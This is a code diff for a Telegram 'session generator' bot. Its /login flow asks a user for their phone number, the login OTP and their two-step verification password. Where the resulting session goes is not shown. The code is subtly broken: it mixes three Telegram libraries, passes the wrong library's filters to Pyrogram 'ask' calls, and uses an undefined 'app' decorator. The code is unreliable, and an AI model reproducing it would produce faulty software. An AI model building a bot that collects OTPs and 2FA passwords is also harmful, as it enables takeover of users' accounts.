@@ -4,14 +4,12 @@ import os
 import random
 import string
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, ConversationHandler, filters
+from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application
+from telegram.ext import filters
 from pyrogram import Client, filters as pyrogram_filters
 from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
 from telethon.errors import SessionPasswordNeededError  # Correct import for session password error
 from config import API_ID, API_HASH, BOT_TOKEN  # Import credentials from config.py
-
-# Define conversation states
-PHONE = range(1)
 
 # Generate random session name for each user
 def generate_random_name(length=7):
@@ -59,9 +57,10 @@ async def clear_db(client, message):
         await message.reply("⚠️ You are not logged in, no session data found.")
 
 # Define the /login command
+@app.on_message(pyrogram_filters.command("login"))
 async def generate_session(_, message):
     user_id = message.chat.id
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=pyrogram_filters.text)   
+    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
     phone_number = number.text
     try:
         await message.reply("📲 Sending OTP...")
@@ -80,7 +79,7 @@ async def generate_session(_, message):
         await message.reply('❌ Invalid phone number. Please restart the session.')
         return
     try:
-        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=pyrogram_filters.text, timeout=600)
+        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
     except TimeoutError:
         await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
         return
@@ -96,7 +95,7 @@ async def generate_session(_, message):
         return
     except SessionPasswordNeededError:
         try:
-            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=pyrogram_filters.text, timeout=300)
+            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
         except TimeoutError:
             await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
             return
@@ -180,7 +179,7 @@ def conversation_handler() -> ConversationHandler:
     return ConversationHandler(
         entry_points=[CommandHandler('login', generate_session)],  # /login command triggers this conversation
         states={
-            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number)],  # Define your phone input handling here
+            'PHONE': [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number)],
         },
         fallbacks=[],
     )
